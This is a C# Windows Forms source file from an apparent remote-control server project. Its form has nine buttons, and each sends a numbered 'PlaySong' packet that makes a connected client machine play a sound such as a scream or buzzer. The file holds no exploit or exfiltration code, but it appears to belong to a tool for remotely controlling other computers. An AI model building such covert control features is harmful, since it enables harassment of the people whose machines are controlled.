using Serveur.Controllers.Server;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace MosaiqueServeur.Views
{
    public partial class FrmPlaySong : Form
    {
        private ClientMosaique _client;

        public FrmPlaySong(ClientMosaique client)
        {
            this._client = client;
            InitializeComponent();
        }

        private void FrmPlaySong_Load(object sender, EventArgs e)
        {
        }

        private void sendPacket(int i)
        {
            new Packets.ServerPackets.PlaySong(i).Execute(_client);
        }

        private void btnScream_Click(object sender, EventArgs e)
        {
            sendPacket(7);
        }

        private void btnMonkey_Click(object sender, EventArgs e)
        {
            sendPacket(5);
        }

        private void btnPartyHorn_Click(object sender, EventArgs e)
        {
            sendPacket(6);
        }

        private void btnAwp_Click(object sender, EventArgs e)
        {
            sendPacket(8);
        }

        private void btnMoney_Click(object sender, EventArgs e)
        {
            sendPacket(2);
        }

        private void btnHorn_Click(object sender, EventArgs e)
        {
            sendPacket(1);

        }

        private void btnSaber_Click(object sender, EventArgs e)
        {
            sendPacket(9);
        }

        private void btnPiano_Click(object sender, EventArgs e)
        {
            sendPacket(4);
        }

        private void btnBuzzer_Click(object sender, EventArgs e)
        {
            sendPacket(3);
        }
    }
}
